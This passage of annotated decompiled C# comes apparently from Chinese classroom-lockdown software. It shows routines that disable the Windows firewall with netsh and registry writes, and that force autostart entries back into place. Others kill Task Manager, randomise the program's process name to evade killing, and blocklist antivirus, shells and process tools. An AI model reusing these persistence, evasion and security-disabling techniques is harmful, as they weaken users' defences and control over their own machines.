					try { 进程.Kill(); }
					catch (Exception) { }
					// 43 号是唯一「只杀不弹窗」的例外
					if (this.关键词匹配下标 != 43)
					{
						try { base.BeginInvoke(new MethodInvoker(this.显示违规软件警告)); }
						catch (Exception) { }
					}
				}
				else
				{
					try { 进程.Kill(); }
					catch (Exception) { }
					try { base.BeginInvoke(new MethodInvoker(this.显示违规软件警告)); }
					catch (Exception) { }
					try { 进程.WaitForExit(1000); }
					catch (Exception) { }
					try { FileSystem.Kill(程序路径); }
					catch (Exception) { }
				}
			}
		}

		/// <summary>
		/// 「防火墙监控」（<c>Timer_fhq</c>，13000 ms）——发现防火墙开着就强制关掉。
		/// <para>
		/// 读 <c>FirewallPolicy\StandardProfile</c> 与 <c>PublicProfile</c> 的 <c>EnableFirewall</c>，
		/// 用 <c>Operators.CompareObjectEqual(v, "1")</c> 判断——<b>拿字符串 "1" 比 DWORD 1</b>，
		/// 靠 VB 弱类型比较把 <c>1</c> 认成相等（这里刻意保留原写法）。
		/// </para>
		/// <para>
		/// 开着就 <see cref="防火墙告警计数"/> 加一：前 5 次先 <c>DisableCMD = 0</c>、
		/// <c>netsh advfirewall set allprofiles state off</c>、两处注册表 <c>EnableFirewall = 0</c>，
		/// 再弹 Form3；超过 5 次升级成 Form2「请重新启动电脑！」。
		/// 防火墙已经关掉就收起 Form3、复位标志。
		/// </para>
		/// </summary>
		/// <param name="sender">Timer_fhq</param>
		/// <param name="e">事件参数</param>
		// Token: 0x0600004B RID: 75 RVA: 0x000040E8 File Offset: 0x000022E8
		private void 防火墙监控(object sender, EventArgs e)
		{
			object 标准配置防火墙 = null;
			try { 标准配置防火墙 = RuntimeHelpers.GetObjectValue(ThreadEvent.SearchCallback(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", "")); }
			catch (Exception) { }
			object 公用配置防火墙 = null;
			try { 公用配置防火墙 = RuntimeHelpers.GetObjectValue(ThreadEvent.SearchCallback(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "EnableFirewall", "")); }
			catch (Exception) { }
			if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(标准配置防火墙, "1", false), Operators.CompareObjectEqual(公用配置防火墙, "1", false))))
			{
				checked
				{
					this.防火墙告警计数++;
				}
				if (this.防火墙告警计数 > 5)
				{
					try { SetterEvent.ComputeCallback.Form3.Close(); }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "你启用了防火墙，危害电子教室的运行！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form2.shuoming2.Text = "请重新启动电脑！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form2.Show(); }
					catch (Exception) { }
					this.Timer2.Enabled = true;
				}
				else
				{
					try { ThreadEvent.EnableCallback(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord); }
					catch (Exception) { }
					try { Interaction.Shell("netsh advfirewall set allprofiles state off", AppWinStyle.Hide, true, -1); }
					catch (Exception) { }
					try { ThreadEvent.EnableCallback(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", 0, RegistryValueKind.DWord); }
					catch (Exception) { }
					try { ThreadEvent.EnableCallback(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "EnableFirewall", 0, RegistryValueKind.DWord); }
					catch (Exception) { }
					this.防火墙告警中 = true;
					try { SetterEvent.ComputeCallback.Form3.shuoming.Text = "你启用了防火墙，危害电子教室的运行！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form3.shuoming2.Text = "现在助手强制关闭防火墙！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form3.Show(); }
					catch (Exception) { }
				}
			}
			else
			{
				if (this.防火墙告警中)
				{
					try { SetterEvent.ComputeCallback.Form3.Close(); }
					catch (Exception) { }
				}
				this.防火墙告警中 = false;
			}
		}

		/// <summary>
		/// 「口令与自启动项监控」（<c>Timer_qdx</c>，3000 ms）——<b>反篡改</b>。
		/// <para>
		/// 1. 读 <c>HKCU\Software\n</c>（退出小助手的口令摘要，= <c>SHA256(口令 + "bfdshgs")</c>），
		/// 和 <see cref="口令摘要快照"/> 不一致就认定学生改了密码：<see cref="口令篡改计数"/> 加一、
		/// <b>强制写回快照值</b>、弹 Form3「你修改了助手的密码！」；超过 25 次升级 Form2。
		/// </para>
		/// <para>
		/// 2. 读 <c>Run\prozs</c> / <c>Run\jfglzsn</c>（64 位视图取不到再查 <c>WOW6432NODE</c>），
		/// 和两份快照对不上就<b>无条件写回</b> <c>&lt;程序目录&gt;\przs.exe</c> 与 <c>&lt;程序目录&gt;\jfglzsn.exe</c>，
		/// 保证自启动项永远指向自己。
		/// </para>
		/// </summary>
		/// <param name="sender">Timer_qdx</param>
		/// <param name="e">事件参数</param>
		// Token: 0x0600004C RID: 76 RVA: 0x000043B8 File Offset: 0x000025B8
		private void 口令与自启动项监控(object sender, EventArgs e)
		{
			checked
			{
				// 原版这里算了个指针位宽（64）却没用上，按字节码保留
				int 指针位宽 = Marshal.SizeOf(IntPtr.Zero) * 8;
				object 当前口令摘要 = null;
				try { 当前口令摘要 = RuntimeHelpers.GetObjectValue(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software", "n", "")); }
				catch (Exception) { }
				if (Operators.ConditionalCompareObjectNotEqual(当前口令摘要, this.口令摘要快照, false))
				{
					// 口令被改：计数、强制写回、警告
					this.口令篡改计数++;
					try { ThreadEvent.EnableCallback(Registry.CurrentUser, "Software", "n", this.口令摘要快照, RegistryValueKind.String); }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form3.shuoming.Text = "你修改了助手的密码！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form3.shuoming2.Text = "现在强制恢复密码！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form3.Show(); }
					catch (Exception) { }
					this.口令告警中 = true;
					if (this.口令篡改计数 > 25)
					{
						try { SetterEvent.ComputeCallback.Form3.Close(); }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "你修改了助手的密码！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.shuoming2.Text = "请重新启动电脑！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form2.Show(); }
						catch (Exception) { }
						this.Timer2.Enabled = true;
					}
				}
				else
				{
					if (this.口令告警中)
					{
						try { SetterEvent.ComputeCallback.Form3.Close(); }
						catch (Exception) { }
					}
					this.口令告警中 = false;
				}
				// —— 自启动项：先查 64 位视图，空再查 Wow6432Node ——
				object prozs自启动值 = null;
				try { prozs自启动值 = RuntimeHelpers.GetObjectValue(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", "")); }
				catch (Exception) { }
				if (Operators.ConditionalCompareObjectEqual(prozs自启动值, "", false))
				{
					try { prozs自启动值 = RuntimeHelpers.GetObjectValue(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", "")); }
					catch (Exception) { }
				}
				object jfglzsn自启动值 = null;
				try { jfglzsn自启动值 = RuntimeHelpers.GetObjectValue(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", "")); }
				catch (Exception) { }
				if (Operators.ConditionalCompareObjectEqual(jfglzsn自启动值, "", false))
				{
					try { jfglzsn自启动值 = RuntimeHelpers.GetObjectValue(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", "")); }
					catch (Exception) { }
				}
				// 两条 Run 项任何一个和快照不一致 → 一起写回正确路径
				if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectNotEqual(prozs自启动值, this.prozs自启动快照, false), Operators.CompareObjectNotEqual(jfglzsn自启动值, this.jfglzsn自启动快照, false))))
				{
					try { ThreadEvent.EnableCallback(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", Application.StartupPath + "\\przs.exe", RegistryValueKind.String); }
					catch (Exception) { }
					try { ThreadEvent.EnableCallback(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", Application.StartupPath + "\\jfglzsn.exe", RegistryValueKind.String); }
					catch (Exception) { }
				}
			}
		}

		/// <summary>
		/// 「极域监控」（<c>Timer_jiyu</c>，15000 ms）——保护极域电子教室的参数与两个服务。
		/// <para>
		/// 1. 按 <see cref="极域注册表分支"/> 读极域的 <c>ChannelId</c> / <c>AutoLogin</c>
		/// （1 = <c>Wow6432Node</c> 视图，2 = 32 位视图），和两份快照不等就认定参数被改：
		/// <see cref="极域参数篡改计数"/> 加一、弹 Form3「你修改了极域电子教室的参数！请马上恢复，否则会锁屏！」；
		/// 超过 5 次升级 Form2。
		/// </para>
		/// <para>
		/// 2. <see cref="极域服务受管"/> 为真时复查 <c>tdfilefilter</c> / <c>tdnetfilter</c> 两个服务：
		/// 任一状态为 0（服务不存在）→ Form3「…2个重要服务不存在！」；
		/// 都在 Running → 收窗复位；否则<b>直接把两个服务拉起来</b>再报警。
		/// <see cref="极域服务告警计数"/> 超过 5 次同样升级 Form2。
		/// </para>
		/// </summary>
		/// <param name="sender">Timer_jiyu</param>
		/// <param name="e">事件参数</param>
		// Token: 0x0600004D RID: 77 RVA: 0x00004750 File Offset: 0x00002950
		private void 极域监控(object sender, EventArgs e)
		{
			checked
			{
				int 通道号 = 0;
				int 自登录 = 0;
				if (this.极域注册表分支 == 1)
				{
					try { 通道号 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\Wow6432Node\\TopDomain\\e-Learning Class\\Student", "ChannelId", "")); }
					catch (Exception) { }
					try { 自登录 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\Wow6432Node\\TopDomain\\e-Learning Class\\Student", "AutoLogin", "")); }
					catch (Exception) { }
				}
				else if (this.极域注册表分支 == 2)
				{
					try { 通道号 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\TopDomain\\e-Learning Class\\Student", "ChannelId", "")); }
					catch (Exception) { }
					try { 自登录 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\TopDomain\\e-Learning Class\\Student", "AutoLogin", "")); }
					catch (Exception) { }
				}
				// —— 参数校验 ——
				if ((通道号 != this.极域通道号快照) | (自登录 != this.极域自登录快照))
				{
					this.极域参数篡改计数++;
					try { SetterEvent.ComputeCallback.Form3.shuoming.Text = "你修改了极域电子教室的参数！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form3.shuoming2.Text = "请马上恢复，否则会锁屏！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form3.Show(); }
					catch (Exception) { }
					this.极域参数告警中 = true;
				}
				else
				{
					if (this.极域参数告警中)
					{
						try { SetterEvent.ComputeCallback.Form3.Close(); }
						catch (Exception) { }
					}
					this.极域参数告警中 = false;
				}
				if (this.极域参数篡改计数 > 5)
				{
					try { SetterEvent.ComputeCallback.Form3.Close(); }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "你修改了极域电子教室的参数！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form2.Show(); }
					catch (Exception) { }
					this.Timer2.Enabled = true;
				}
				// —— 服务校验 ——
				if (this.极域服务受管)
				{
					try { this.tdfilefilter服务.Refresh(); }
					catch (Exception) { }
					try { this.tdnetfilter服务.Refresh(); }
					catch (Exception) { }
					if ((this.tdfilefilter服务.Status == (ServiceControllerStatus)0) | (this.tdnetfilter服务.Status == (ServiceControllerStatus)0))
					{
						// 服务被删掉
						this.极域服务告警计数++;
						try { SetterEvent.ComputeCallback.Form3.shuoming.Text = "极域电子教室的2个重要服务不存在！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form3.Show(); }
						catch (Exception) { }
						this.极域服务告警中 = true;
					}
					else if ((this.tdfilefilter服务.Status == ServiceControllerStatus.Running) & (this.tdnetfilter服务.Status == ServiceControllerStatus.Running))
					{
						if (this.极域服务告警中)
						{
							try { SetterEvent.ComputeCallback.Form3.Close(); }
							catch (Exception) { }
						}
						this.极域服务告警中 = false;
					}
					else
					{
						// 服务被停：强制拉起来
						try { this.tdfilefilter服务.Start(); }
						catch (Exception) { }
						try { this.tdnetfilter服务.Start(); }
						catch (Exception) { }
						this.极域服务告警计数++;
						try { SetterEvent.ComputeCallback.Form3.shuoming.Text = "极域电子教室的2个重要服务停止！"; }
						catch (Exception) { }
						try { SetterEvent.ComputeCallback.Form3.Show(); }
						catch (Exception) { }
						this.极域服务告警中 = true;
					}
				}
				if (this.极域服务告警计数 > 5)
				{
					try { SetterEvent.ComputeCallback.Form3.Close(); }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form2.shuoming.Text = "极域电子教室的2个重要服务停止！"; }
					catch (Exception) { }
					try { SetterEvent.ComputeCallback.Form2.Show(); }
					catch (Exception) { }
					this.Timer2.Enabled = true;
				}
			}
		}

		/// <summary>
		/// 「定时刷新hosts」（<c>Timer_updatehosts</c>，30000 ms）——后台持续刷新封禁名单。
		/// <para>
		/// 无条件再拉一次名单（<see cref="下载并写入hosts黑名单"/>）；如果本轮已经成功接管 hosts，
		/// 就把当前的 hosts 备份成 <c>hosts2</c> 并关掉自己（封网只做一轮，之后靠原始 hosts 还原）。
		/// </para>
		/// <para><b>注意</b>：本方法原版就<b>没有</b> <c>On Error</c> 脚手架，异常会直接冒泡，这里照旧不包 try/catch。</para>
		/// </summary>
		/// <param name="sender">Timer_updatehosts</param>
		/// <param name="e">事件参数</param>
		// Token: 0x0600004E RID: 78 RVA: 0x00004C10 File Offset: 0x00002E10
		private void 定时刷新hosts(object sender, EventArgs e)
		{
			this.下载并写入hosts黑名单("http://" + this.云端域名 + "/hmd_net.txt", "on");
			if (this.hosts已写入)
			{
				File.SetAttributes(this.hosts路径 + "2", FileAttributes.Normal);
				File.Copy(this.hosts路径, this.hosts路径 + "2", true);
				this.Timer_updatehosts.Enabled = false;
			}
		}

		/// <summary>
		/// 「窗体加载初始化」——<c>Form1_Load</c>，整个程序的初始化总入口（九步）。
		/// <list type="number">
		/// <item>隐藏窗体（常驻后台，不进任务栏）；</item>
		/// <item>按「月 × 日」当种子派生 4 字母随机进程名，再随机一次得 5 字符名覆盖掉，
		/// 同时拼出伪装安装目录 <c>C:\Program Files (x86)\&lt;4 字符&gt;</c>；</item>
		/// <item>读四项策略开关（<c>dzjs</c> / <c>usb_jianche</c> / <c>shadu_jianche</c> / <c>cmd_jianche</c>）；</item>
		/// <item>拆分电子教室配置串，判定 <see cref="监控模式"/>（0 不监控 / 1 按进程名 / 2 带路径）与进程名、程序路径；</item>
		/// <item>填满 <see cref="进程名黑名单"/>（28 项）与 <see cref="关键词黑名单"/>（78 项），并置 <see cref="关键词表上界"/>；</item>
		/// <item><b>立刻杀一次 <c>taskmgr</c></b>；</item>
		/// <item>装 WMI <c>__InstanceCreationEvent</c>（1 秒间隔）监视器并挂上 <see cref="新进程拦截"/>；</item>
		/// <item>探测极域注册表分支与两个服务，记录口令 / 自启动项的基线快照；</item>
		/// <item>读 <c>gaowei</c>、<c>zhuye</c>，检测杀软；没装杀软且有云端域名就拉起 <c>&lt;程序目录&gt;\zy.exe</c>。</item>
		/// </list>
		/// <para>
		/// 原版整段 <c>On Error Resume Next</c>，所以每一步都单独 try/catch——
		/// 尤其是「杀 taskmgr 失败」绝不能挡住后面的 WMI 监听安装。
		/// </para>
		/// </summary>
		/// <param name="sender">Form1</param>
		/// <param name="e">事件参数</param>
		private void 窗体加载初始化(object sender, EventArgs e)
		{
			checked
			{
				// ——— 第 1 步：隐藏窗体 ———
				try { base.Hide(); }
				catch (Exception) { }
				// ——— 第 2 步：派生随机进程名（规避按名字查杀）———
				int 日期种子 = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now);
				int 余7 = 日期种子 % 7;
				int 余9 = 日期种子 % 9;
				int 余5 = 日期种子 % 5;
				int 余3 = 日期种子 % 3;
				string 四位进程名;
				if (日期种子 % 2 == 0)
				{
					四位进程名 = Conversions.ToString(Strings.Chr(97 + 余7)) + Conversions.ToString(Strings.Chr(98 + 余9)) + Conversions.ToString(Strings.Chr(101 + 余5)) + Conversions.ToString(Strings.Chr(99 + 余3));
				}
				else
				{
					四位进程名 = Conversions.ToString(Strings.Chr(97 + 余9)) + Conversions.ToString(Strings.Chr(98 + 余7)) + Conversions.ToString(Strings.Chr(101 + 余3)) + Conversions.ToString(Strings.Chr(99 + 余5));
				}
				ThreadEvent.m_AdapterEvent = 四位进程名;
				ThreadEvent._AdvisorEvent = 四位进程名 + ".exe";
				// 再随机一次：5 个字符（105~114 → 'i'~'r'），覆盖上面那个名字
				VBMath.Randomize((double)日期种子);
				long 随机数 = (long)Math.Round(unchecked((double)VBMath.Rnd() * 100000.0 * 3.0 + 1.0));
				string 五位进程名 = "";
				int 拼名计数 = 1;
				do
				{
					long 字符码 = 随机数 % 10L + 105L;
					五位进程名 = Conversions.ToString(Strings.Chr((int)字符码)) + 五位进程名;
					随机数 /= 10L;
					拼名计数++;
				}
				while (拼名计数 <= 5);
				ThreadEvent.m_AdapterEvent = 五位进程名;
				ThreadEvent._AdvisorEvent = 五位进程名 + ".exe";
				this.伪装安装目录 = "C:\\Program Files (x86)\\" + Strings.Mid(五位进程名, 2, 4);
				// ——— 第 3 步：读四项策略开关 ———
				try { this.电子教室配置串 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software\\jfglzs", "dzjs", "")); }
				catch (Exception) { }
				try { this.U盘检查开关 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", "")); }
				catch (Exception) { }
				try { this.杀毒检查开关 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software\\jfglzs", "shadu_jianche", "")); }
				catch (Exception) { }
				try { this.命令提示符检查开关 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software\\jfglzs", "cmd_jianche", "")); }
				catch (Exception) { }
				// ——— 第 4 步：拆配置串，判定监控模式与进程名 ———
				try { this.电子教室进程表 = Strings.Split(this.电子教室配置串, ",", -1, CompareMethod.Binary); }
				catch (Exception) { }
				// 首项是 other 或空 → 不监控；带反斜杠（是完整路径）→ 模式 2；否则按进程名 → 模式 1
				if ((Operators.CompareString(this.电子教室进程表[0], "other", false) == 0) | (Operators.CompareString(this.电子教室进程表[0], "", false) == 0))
				{
					this.监控模式 = 0;
				}
				else if (Strings.InStr(this.电子教室进程表[0], "\\", CompareMethod.Binary) != 0)
				{
					this.监控模式 = 2;
				}
				else
				{
					this.监控模式 = 1;
				}
				this.电子教室程序路径 = this.电子教室进程表[0];
				this.电子教室进程名 = Strings.Replace(Path.GetFileName(this.电子教室程序路径), ".exe", "", 1, -1, CompareMethod.Binary);
				// ——— 第 5 步：填判据表（一）进程名黑名单 [1..28] ———
				// 前 10 项是杀软、11~16 是进程工具、17~21 是解压软件、22 之后是极域破解工具
				this.进程名黑名单[1] = "|HipsTray.exe";
				this.进程名黑名单[2] = "|备用";
				this.进程名黑名单[3] = "|备用";
				this.进程名黑名单[4] = "|360tray.exe";
				this.进程名黑名单[5] = "|NetFlow.exe";
				this.进程名黑名单[6] = "|QQPCTray.exe";
				this.进程名黑名单[7] = "|360taskmgr";
				this.进程名黑名单[8] = "|QQPCNetFlow.exe";
				this.进程名黑名单[9] = "|360netman.exe";
				this.进程名黑名单[10] = "|iu杀毒";
				this.进程名黑名单[11] = "进程";
				this.进程名黑名单[12] = "任务管理";
				this.进程名黑名单[13] = "虚拟桌面";
				this.进程名黑名单[14] = "|Minesweeper";
				this.进程名黑名单[15] = "|winmine.exe";
				this.进程名黑名单[16] = "|solitaire.exe";
				this.进程名黑名单[17] = "|winrarrr.exe";
				this.进程名黑名单[18] = "|wzmainnn.exe";
				this.进程名黑名单[19] = "|bandizippp.exe";
				this.进程名黑名单[20] = "|7zFMMM.exe";
				this.进程名黑名单[21] = "|360zippp.exe";
				this.进程名黑名单[22] = "掌控课堂";
				this.进程名黑名单[23] = "夕颜若雪工具箱";
				this.进程名黑名单[24] = "极域";
				this.进程名黑名单[25] = "课堂狂欢器";
				this.进程名黑名单[26] = "电子教室";
				this.进程名黑名单[27] = "吾爱破解";
				this.进程名黑名单[28] = "|NoTopDomain";
				// ——— 第 5 步：填判据表（二）文件属性关键词黑名单 [1..78] ———
				// 用「产品名 + 文件说明」做子串匹配；起点受 cmd_jianche 控制
				this.关键词黑名单[1] = "Windows 命令处理程序";
				this.关键词黑名单[2] = "Windows Command Processor";
				this.关键词黑名单[3] = "Windows PowerShell";
				this.关键词黑名单[4] = "注册表编辑器";
				this.关键词黑名单[5] = "Microsoft 管理控制台";
				this.关键词黑名单[6] = "任务管理器";
				this.关键词黑名单[7] = "PC Hunter";
				this.关键词黑名单[8] = "IceSword";
				this.关键词黑名单[9] = "Wsyscheck";
				this.关键词黑名单[10] = "SnipeSword";
				this.关键词黑名单[11] = "Process Explorer";
				this.关键词黑名单[12] = "狡兔二窟";
				this.关键词黑名单[13] = "Process-X";
				this.关键词黑名单[14] = "Process Master";
				this.关键词黑名单[15] = "PrcView";
				this.关键词黑名单[16] = "Process Viewer";
				this.关键词黑名单[17] = "PowerTool";
				this.关键词黑名单[18] = "Windows Kernel Explorer";
				this.关键词黑名单[19] = "FTCleaner";
				this.关键词黑名单[20] = "Process Lasso";
				this.关键词黑名单[21] = "process manager";
				this.关键词黑名单[22] = "Process Hacker";
				this.关键词黑名单[23] = "ProcessOVER";
				this.关键词黑名单[24] = "Dexpot";
				this.关键词黑名单[25] = "Deskman";
				this.关键词黑名单[26] = "iDesktop";
				this.关键词黑名单[27] = "YtMDesk";
				this.关键词黑名单[28] = "DexpotProPortable";
				this.关键词黑名单[29] = "Desktops";
				this.关键词黑名单[30] = "Wise Desktop";
				this.关键词黑名单[31] = "VDesktop";
				this.关键词黑名单[32] = "MagicDesktop";
				this.关键词黑名单[33] = "MultiDesk";
				this.关键词黑名单[34] = "小宝虚拟桌面";
				this.关键词黑名单[35] = "系统配置实用程序";
				this.关键词黑名单[36] = "资源和性能监视器";
				this.关键词黑名单[37] = "Special Setting Program";
				this.关键词黑名单[38] = "瑞星防火墙";
				this.关键词黑名单[39] = "火绒剑";
				this.关键词黑名单[40] = "超级进程王";
				this.关键词黑名单[41] = "OpenArk";
				this.关键词黑名单[42] = "Procmon";
				this.关键词黑名单[43] = "GameBar";
				this.关键词黑名单[44] = "Registry Workshop";
				this.关键词黑名单[45] = "屏幕键盘";
				this.关键词黑名单[46] = "暂 时 备 用";
				this.关键词黑名单[47] = "暂 时 备 用";
				this.关键词黑名单[48] = "暂 时 备 用";
				this.关键词黑名单[49] = "暂 时 备 用";
				this.关键词黑名单[50] = "暂 时 备 用";
				this.关键词黑名单[51] = "极域杀手";
				this.关键词黑名单[52] = "极域墓地制造器";
				this.关键词黑名单[53] = "极域杀死";
				this.关键词黑名单[54] = "翘课";
				this.关键词黑名单[55] = "夕颜若雪工具箱";
				this.关键词黑名单[56] = "学生机房Hack助手";
				this.关键词黑名单[57] = "再见极域";
				this.关键词黑名单[58] = "KillControl";
				this.关键词黑名单[59] = "去除控制";
				this.关键词黑名单[60] = "MsgFlood";
				this.关键词黑名单[61] = "极域工具包";
				this.关键词黑名单[62] = "Astrum For Online Classroom";
				this.关键词黑名单[63] = "JiYu Trainer";
				this.关键词黑名单[64] = "掌控课堂";
				this.关键词黑名单[65] = "FuckMythware";
				this.关键词黑名单[66] = "Hello Teacher";
				this.关键词黑名单[67] = "JIYUPLUS";
				this.关键词黑名单[68] = "极域Tool";
				this.关键词黑名单[69] = "微机课救星";
				this.关键词黑名单[70] = "极域X";
				this.关键词黑名单[71] = "UnMythware";
				this.关键词黑名单[72] = ThreadEvent._EventSetter;
				this.关键词黑名单[73] = "BITS管理实用程序";
				this.关键词黑名单[74] = "DzjsTools";
				this.关键词黑名单[75] = "SkiesKiller";
				this.关键词黑名单[76] = ThreadEvent.callbackSetter;
				this.关键词黑名单[77] = "MultiDeskTop应用程序";
				this.关键词黑名单[78] = "极域电子教室克星";
				// 表的上界（第 79 项起是空的，云端名单下发时可以往后追加）
				this.关键词表上界 = 78;
				// ——— 第 6 步：加载时立刻杀一次任务管理器 ———
				try
				{
					Process[] 任务管理器进程 = Process.GetProcessesByName("taskmgr");
					任务管理器进程[0].Kill();
				}
				catch (Exception) { }
				// ——— 第 7 步：装 WMI 新进程监听（1 秒轮询 Win32_Process 的创建事件）———
				try
				{
					WqlEventQuery 进程创建查询 = new WqlEventQuery("__InstanceCreationEvent", new TimeSpan(0, 0, 1), "TargetInstance ISA 'Win32_Process'");
					this.新进程监视器 = new ManagementEventWatcher(进程创建查询);
					this.新进程监视器.EventArrived += this.新进程拦截;
					this.新进程监视器.Start();
				}
				catch (Exception) { }
				// ——— 第 8 步：极域探测（先 64 位视图，ChannelId 为 0 就再试 32 位视图）———
				try { this.极域通道号快照 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\Wow6432Node\\TopDomain\\e-Learning Class\\Student", "ChannelId", "")); }
				catch (Exception) { }
				try { this.极域自登录快照 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\Wow6432Node\\TopDomain\\e-Learning Class\\Student", "AutoLogin", "")); }
				catch (Exception) { }
				if (this.极域通道号快照 != 0)
				{
					this.极域注册表分支 = 1;
					this.Timer_jiyu.Enabled = true;
				}
				else
				{
					try { this.极域通道号快照 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\TopDomain\\e-Learning Class\\Student", "ChannelId", "")); }
					catch (Exception) { }
					try { this.极域自登录快照 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\TopDomain\\e-Learning Class\\Student", "AutoLogin", "")); }
					catch (Exception) { }
					if (this.极域通道号快照 != 0)
					{
						this.极域注册表分支 = 2;
						this.Timer_jiyu.Enabled = true;
					}
				}
				// 两个极域服务：状态为 0 就是服务不存在，不纳管；停着就强行拉起来；都 Running 才算「受管」
				try
				{
					if ((this.tdfilefilter服务.Status == (ServiceControllerStatus)0) | (this.tdnetfilter服务.Status == (ServiceControllerStatus)0))
					{
						this.极域服务受管 = false;
					}
					else
					{
						if ((this.tdfilefilter服务.Status == ServiceControllerStatus.Stopped) | (this.tdnetfilter服务.Status == ServiceControllerStatus.Stopped))
						{
							this.tdfilefilter服务.Start();
							this.tdnetfilter服务.Start();
						}
						Thread.Sleep(1000);
						if ((this.tdfilefilter服务.Status == ServiceControllerStatus.Running) & (this.tdnetfilter服务.Status == ServiceControllerStatus.Running))
						{
							this.极域服务受管 = true;
						}
					}
				}
				catch (Exception) { }
				// ——— 第 8 步（续）：记录三份基线快照，之后所有篡改判定都跟它们比 ———
				try { this.口令摘要快照 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software", "n", "")); }
				catch (Exception) { }
				try { this.prozs自启动快照 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", "")); }
				catch (Exception) { }
				if (Operators.CompareString(this.prozs自启动快照, "", false) == 0)
				{
					try { this.prozs自启动快照 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", "")); }
					catch (Exception) { }
				}
				try { this.jfglzsn自启动快照 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", "")); }
				catch (Exception) { }
				if (Operators.CompareString(this.jfglzsn自启动快照, "", false) == 0)
				{
					try { this.jfglzsn自启动快照 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.LocalMachine, "SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", "")); }
					catch (Exception) { }
				}
				// 解压拦截开关（默认 2）与云端域名（拼名单 URL 用）
				try { this.解压拦截开关 = Conversions.ToInteger(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 2)); }
				catch (Exception) { }
				try { this.云端域名 = Conversions.ToString(ThreadEvent.SearchCallback(Registry.CurrentUser, "Software\\jfglzs", "zhuye", "")); }
				catch (Exception) { }
				// ——— 第 9 步：杀软检测。命中就只弹提示、不拉起附加程序 ———
				if (this.进程是否在运行("QQPCTray") | this.进程是否在运行("360sd") | this.进程是否在运行("360Tray"))
				{
